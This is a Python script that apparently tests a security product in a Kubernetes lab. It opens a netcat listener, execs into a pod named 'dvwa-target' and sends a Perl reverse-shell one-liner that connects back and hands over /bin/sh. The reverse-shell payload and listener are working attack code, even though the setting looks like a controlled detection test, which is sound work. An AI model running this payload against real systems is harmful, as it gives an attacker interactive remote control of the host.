import subprocess
import pexpect
import signal
import time

from core_package import get_pod_internal_ip


def run_perl_command():
    process = subprocess.Popen(['nc', '-lvvp', '13888'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        while True:
            output = process.stdout.readline().decode()
            print(output, end='')
            keywords = ['received', 'Connection from', 'connect to']
            if any(keyword in output for keyword in keywords):
                print("\033[92m>>监听到shell，5s后终止进程\033[0m")
                break
        time.sleep(5)
        process.terminate()
    except Exception as e:
        print("\033[92m>>Error occurred:\033[0m", str(e))
        process.terminate()


def exec_perl_process():
    get_pods_command = ["kubectl", "get", "pod", "-n", "xinfan"]
    process = subprocess.Popen(get_pods_command, stdout=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        print(">>Error occurred:", error)
        return

    pod_name = None
    for line in output.decode().split('\n'):
        if line.split()[0].startswith("dvwa-target"):
            pod_name = line.split()[0]
            break

    if not pod_name:
        print(">>No pod found with 'dvwa-target' in its name")
        return

    exec_command = "kubectl exec -it {} -n xinfan /bin/bash".format(pod_name)

    child = pexpect.spawn(exec_command)
    ip_address = get_pod_internal_ip('armor-poc-worker')
    command_to_execute_in_shell = f"perl -e 'use Socket;$i=\"{ip_address}\";$p=13888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    child.sendline(command_to_execute_in_shell)
    print("\033[92m>>Perl脚本执行成功，5s后自动结束进程\033[0m")
    time.sleep(5)
    child.kill(signal.SIGINT)
    return
